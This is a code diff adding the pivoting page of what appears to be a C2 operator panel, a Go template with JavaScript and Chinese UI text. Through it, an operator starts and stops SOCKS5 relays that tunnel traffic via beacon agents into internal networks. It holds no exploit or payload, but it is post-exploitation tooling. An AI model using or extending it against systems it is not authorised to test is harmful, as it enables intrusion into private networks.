@@ -1,0 +1,225 @@
+{{define "pivoting_content"}}
+<div class="max-w-7xl mx-auto space-y-6">
+    <!-- Header -->
+    <div class="flex items-center justify-between">
+        <div>
+            <h1 class="text-3xl font-semibold tracking-tight">隧道与代理 (Pivoting)</h1>
+            <p class="text-slate-500 mt-1">通过 C2 中继的 SOCKS5 反向代理 — 服务端开口，Agent 端拨号</p>
+        </div>
+        <button onclick="refreshSessions()" class="flex items-center gap-x-2 px-4 py-2 bg-slate-100 hover:bg-slate-200 rounded-xl text-sm transition-colors">
+            <i class="fa-solid fa-rotate"></i> 刷新
+        </button>
+    </div>
+
+    <!-- Active Relays -->
+    <div class="bg-white border border-slate-200 rounded-3xl p-6">
+        <div class="flex items-center justify-between mb-4">
+            <div class="font-semibold flex items-center gap-x-2">
+                <i class="fa-solid fa-tower-broadcast text-emerald-500"></i> C2 SOCKS 中继（服务端转发）
+            </div>
+            <div class="text-xs text-slate-400">操作员代理工具 → C2 服务器 → Beacon 隧道 → Agent → 目标</div>
+        </div>
+
+        <div id="sessions-container">
+            <div class="text-slate-400 text-sm py-8 text-center" id="no-sessions">加载中...</div>
+        </div>
+    </div>
+
+    <!-- Start New Relay -->
+    <div class="bg-white border border-slate-200 rounded-3xl p-6">
+        <div class="font-semibold flex items-center gap-x-2 mb-4">
+            <i class="fa-solid fa-plus text-indigo-500"></i> 启动新 SOCKS 中继
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+            <!-- Agent selector -->
+            <div>
+                <label class="text-xs font-medium text-slate-500 mb-1 block">选择在线 Agent</label>
+                <select id="relay-agent" class="w-full border border-slate-200 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-indigo-400">
+                    <option value="">-- 选择 Agent --</option>
+                    {{range .Agents}}
+                    <option value="{{.ID}}" data-hostname="{{.Hostname}}">{{.Hostname}} ({{.IP}}) - {{.ID}}</option>
+                    {{end}}
+                </select>
+            </div>
+
+            <!-- Port + Start -->
+            <div class="flex items-end gap-x-3">
+                <div class="flex-1">
+                    <label class="text-xs font-medium text-slate-500 mb-1 block">本地监听端口 (C2 服务端)</label>
+                    <input id="relay-port" type="number" value="1080" min="1" max="65535"
+                           class="w-full border border-slate-200 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-indigo-400">
+                </div>
+                <button onclick="startRelay()" class="h-[42px] px-6 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-sm font-medium transition-colors whitespace-nowrap">
+                    <i class="fa-solid fa-play mr-1"></i> 启动中继
+                </button>
+            </div>
+        </div>
+
+        <div class="mt-4 p-3 bg-indigo-50 rounded-2xl text-xs text-indigo-700">
+            <i class="fa-solid fa-info-circle mr-1"></i>
+            <b>使用方法：</b>启动后，将你的代理工具（proxychains / Proxifier / 浏览器代理设置）指向 <code>C2服务器IP:端口</code>。
+            流量将通过 Beacon 隧道中转到 Agent，由 Agent 在内网拨号连接目标。
+        </div>
+    </div>
+
+    <!-- Agent-Local SOCKS (Legacy) -->
+    <div class="bg-white border border-slate-200 rounded-3xl p-6">
+        <div class="font-semibold flex items-center gap-x-2 mb-3">
+            <i class="fa-solid fa-network-wired text-amber-500"></i> Agent 本地 SOCKS5（传统模式）
+        </div>
+        <p class="text-sm text-slate-500 mb-3">
+            在 Agent 主机上直接监听 SOCKS5 端口。适用于 Agent IP 可直达的场景（如同一内网）。
+            如需通过 C2 中继，请使用上方的「C2 SOCKS 中继」。
+        </p>
+
+        {{if .Agents}}
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 text-sm">
+            {{range .Agents}}
+            <div class="border rounded-2xl p-3 hover:bg-slate-50">
+                <div class="flex justify-between items-center">
+                    <div class="font-medium">{{.Hostname}}</div>
+                    <span class="text-xs text-slate-400">{{.IP}}</span>
+                </div>
+                <div class="mt-2">
+                    <button onclick="startSocksLocal('{{.ID}}')" class="text-xs px-3 py-1 bg-amber-100 hover:bg-amber-200 rounded-xl transition-colors">
+                        本地 SOCKS (1080)
+                    </button>
+                </div>
+            </div>
+            {{end}}
+        </div>
+        {{else}}
+        <div class="text-slate-400 text-sm py-4 text-center">暂无在线 Agent</div>
+        {{end}}
+    </div>
+</div>
+
+<script>
+// ── State ──
+let sessions = [];
+
+// ── Load sessions ──
+async function refreshSessions() {
+    try {
+        const resp = await fetch('/socks/sessions');
+        const data = await resp.json();
+        sessions = data.sessions || [];
+        renderSessions();
+    } catch (e) {
+        console.error('Failed to load sessions:', e);
+    }
+}
+
+function renderSessions() {
+    const container = document.getElementById('sessions-container');
+    const noSessions = document.getElementById('no-sessions');
+
+    if (sessions.length === 0) {
+        container.innerHTML = '<div class="text-slate-400 text-sm py-8 text-center">暂无活跃的 SOCKS 中继会话</div>';
+        return;
+    }
+
+    let html = '<div class="space-y-3">';
+    for (const s of sessions) {
+        const statusColor = s.active ? 'bg-emerald-500' : 'bg-slate-300';
+        const statusText = s.active ? '运行中' : '已停止';
+        const created = s.created_at ? new Date(s.created_at).toLocaleString() : '-';
+
+        html += `
+        <div class="border rounded-2xl p-4 ${s.active ? 'border-emerald-200 bg-emerald-50/30' : ''}">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center gap-x-3">
+                    <span class="w-2.5 h-2.5 rounded-full ${statusColor}"></span>
+                    <div>
+                        <div class="font-medium text-sm">${s.agent_id.substring(0, 12)}...</div>
+                        <div class="text-xs text-slate-500">端口 <b>${s.listen_port}</b> · ${statusText} · 创建于 ${created}</div>
+                    </div>
+                </div>
+                <div class="flex items-center gap-x-4">
+                    <div class="text-xs text-slate-500 text-right">
+                        <div><i class="fa-solid fa-arrow-down mr-1"></i>${formatBytes(s.bytes_in || 0)} 入</div>
+                        <div><i class="fa-solid fa-arrow-up mr-1"></i>${formatBytes(s.bytes_out || 0)} 出</div>
+                    </div>
+                    <div class="text-xs text-slate-500">
+                        <i class="fa-solid fa-plug mr-1"></i>${s.active_conn || 0}/${s.conn_count || 0} 连接
+                    </div>
+                    ${s.active ? `
+                        <button onclick="stopRelay('${s.agent_id}')" class="px-3 py-1.5 bg-red-100 hover:bg-red-200 text-red-700 rounded-xl text-xs transition-colors">
+                            <i class="fa-solid fa-stop mr-1"></i>停止
+                        </button>
+                    ` : ''}
+                </div>
+            </div>
+        </div>`;
+    }
+    html += '</div>';
+    container.innerHTML = html;
+}
+
+function formatBytes(bytes) {
+    if (bytes === 0) return '0 B';
+    const k = 1024;
+    const sizes = ['B', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return (bytes / Math.pow(k, i)).toFixed(1) + ' ' + sizes[i];
+}
+
+// ── Actions ──
+async function startRelay() {
+    const agentId = document.getElementById('relay-agent').value;
+    const port = document.getElementById('relay-port').value;
+    if (!agentId) { alert('请选择一个 Agent'); return; }
+    if (!port || port < 1 || port > 65535) { alert('请输入有效端口 (1-65535)'); return; }
+
+    try {
+        const resp = await fetch(`/agents/${agentId}/socks_relay/start`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'port=' + encodeURIComponent(port)
+        });
+        const data = await resp.json();
+        if (data.success) {
+            alert(`SOCKS 中继已启动！\n\n监听地址: 0.0.0.0:${data.port}\n\n将代理工具指向 C2 服务器的 ${data.port} 端口即可。`);
+            refreshSessions();
+        } else {
+            alert('启动失败: ' + (data.error || '未知错误'));
+        }
+    } catch (e) {
+        alert('请求失败: ' + e.message);
+    }
+}
+
+async function stopRelay(agentId) {
+    if (!confirm('确定停止此 SOCKS 中继？所有活跃连接将被断开。')) return;
+    try {
+        const resp = await fetch(`/agents/${agentId}/socks_relay/stop`, {
+            method: 'POST'
+        });
+        const data = await resp.json();
+        if (data.success) {
+            refreshSessions();
+        } else {
+            alert('停止失败: ' + (data.error || '未知错误'));
+        }
+    } catch (e) {
+        alert('请求失败: ' + e.message);
+    }
+}
+
+function startSocksLocal(agentId) {
+    const port = prompt("Agent 本地 SOCKS 端口", "1080");
+    fetch(`/agents/${agentId}/socks`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'port=' + encodeURIComponent(port || '1080')
+    }).then(r => r.json()).then(() => {
+        alert('Agent 本地 SOCKS 任务已下发');
+    });
+}
+
+// ── Init ──
+refreshSessions();
+setInterval(refreshSessions, 5000); // Auto-refresh every 5s
+</script>
+{{end}}
